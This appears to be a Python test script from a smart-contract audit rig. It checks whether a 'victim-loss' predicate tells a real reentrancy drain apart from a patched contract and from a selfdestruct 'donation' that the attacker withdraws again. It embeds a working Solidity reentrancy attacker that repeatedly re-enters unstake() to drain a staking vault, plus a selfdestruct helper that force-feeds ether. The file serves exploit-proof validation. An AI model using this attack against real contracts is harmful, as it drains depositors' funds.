#!/usr/bin/env python3
"""Does asking "who lost?" separate a real drain from a donation the attacker took back?

The audit found 25 of this project's 68 claimed proofs were on the PATCHED half of an
authored pair, and the recurring shape was ether forced into the target during setup and
then extracted -- real profit, real drain out of the contract, no defect. Every gate the
project has says yes to that, because they all ask whether the attacker did better than a
baseline the attacker's own author wrote.

The victim-loss predicate asks a different question. Three cases, and it has to get all
three right or it is not an improvement:

  1. A genuine reentrancy drain, where a depositor cannot get their money back
     afterwards. Must be ACCEPTED.
  2. The same attack against the PATCHED twin, where the guard holds. Must be REFUSED.
  3. The donation artefact: setup force-feeds ether with a selfdestruct helper and the
     attacker withdraws it. The attacker really does profit and the contract really is
     drained, but every depositor is still whole. Must be REFUSED -- on the VULNERABLE
     half too, since taking back a donation is not what makes that contract defective.

Pure CPU. No gateway requests.
"""

from __future__ import annotations

import json
import os
import re
import sys
from pathlib import Path

sys.path.insert(0, os.path.expanduser("~/rig/arbiter"))

from arbiter.workspace import Workspace  # noqa: E402

RIG = Path(os.path.expanduser("~/rig/arbiter"))
WS = Path("/tmp/victim-probe")

ATTACKER = """
contract Attacker {
    StakingVault public v;
    uint256 public hits;
    constructor(address _v) payable { v = StakingVault(payable(_v)); }
    function attack() external {
        v.stake{value: 1 ether}();
        v.unstake();
    }
    receive() external payable {
        if (hits < 8 && address(v).balance >= 1 ether) { hits++; v.unstake(); }
    }
}
"""

# A real drain: reenter unstake() and take the pool, including the victim's deposit.
DRAIN = dict(
    deploy_code="StakingVault target = new StakingVault{value: 5 ether}();",
    attacker_code=ATTACKER,
    mode="contract",
    victim_enter="target.stake{value: 2 ether}();",
    victim_exit="target.unstake();",
)

# The artefact: the attacker donates with a self-destructing helper and takes it back.
# Profitable, drains the contract, harms nobody.
DONATION = dict(
    deploy_code=(
        "StakingVault target = new StakingVault{value: 5 ether}();\n"
        "new Bomb{value: 3 ether}(payable(address(target)));"
    ),
    attacker_code="""
contract Bomb {
    constructor(address payable t) payable { selfdestruct(t); }
}

contract Attacker {
    StakingVault public v;
    constructor(address _v) payable { v = StakingVault(payable(_v)); }
    function attack() external { v.stake{value: 1 ether}(); v.unstake(); }
    receive() external payable {}
}
""",
    mode="contract",
    victim_enter="target.stake{value: 2 ether}();",
    victim_exit="target.unstake();",
)


def load(sample_id: str) -> str:
    for name in ("v4_test.json", "v3_authored.json"):
        path = RIG / "evalsets" / name
        if not path.is_file():
            continue
        data = json.loads(path.read_text(encoding="utf-8"))
        for item in data.get("items", []):
            if item["id"] == sample_id:
                return item["code"]
    raise SystemExit(f"sample {sample_id!r} not found in any evalset")


def probe(label: str, spec: dict, sample_id: str, expect: bool) -> bool:
    source = load(sample_id)
    ws = Workspace(WS, f"{label}_{sample_id}"[:70], source)
    detail = ""
    try:
        try:
            solidity = ws.compose_victim_loss(**spec)
        except ValueError as exc:
            print(f"  [SETUP] {label:9s} {sample_id[:30]:32s} refused: {str(exc)[:60]}")
            return not expect
        ws.write_poc("Victim", solidity)
        build = ws.build()
        if not build.ok:
            errs = [ln.strip()[:100] for ln in build.combined.splitlines()
                    if "Error" in ln][:2]
            print(f"  [SETUP] {label:9s} {sample_id[:30]:32s} no build: {errs}")
            return False
        run = ws.run_poc("VictimPoc")
        accepted = any(l.strip().startswith("[PASS]") for l in run.combined.splitlines())
        hit = re.search(r"(ArbiterNoHarm\([^)]*\))", run.combined)
        detail = hit.group(1)[:70] if hit else ""
    finally:
        ws.cleanup()

    ok = accepted == expect
    print(f"  [{'OK  ' if ok else 'WRONG'}] {label:9s} {sample_id[:30]:32s} "
          f"{'ACCEPTED' if accepted else 'REFUSED '}  {detail}")
    return ok


def main() -> int:
    print("a vulnerability is someone else losing, not the attacker out-earning a")
    print("baseline the attacker's own author chose.\n")
    results = [
        probe("drain", DRAIN, "V_reentrancy_unstake", True),
        probe("drain", DRAIN, "S_reentrancy_unstake", False),
        probe("donation", DONATION, "V_reentrancy_unstake", False),
        probe("donation", DONATION, "S_reentrancy_unstake", False),
    ]
    print(f"\n{sum(results)}/{len(results)} as expected")
    return 0 if all(results) else 1


if __name__ == "__main__":
    raise SystemExit(main())
